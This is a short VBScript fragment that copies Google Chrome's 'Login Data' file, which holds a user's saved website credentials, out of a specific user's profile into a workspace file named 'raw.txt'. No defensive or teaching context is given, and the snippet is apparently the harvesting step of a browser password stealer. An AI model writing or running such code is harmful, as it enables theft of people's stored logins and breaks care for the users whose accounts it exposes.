Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.CopyFile "C:\Users\ttanh\AppData\Local\Google\Chrome\User Data\Default\Login Data", "C:\workspace\raw.txt", True
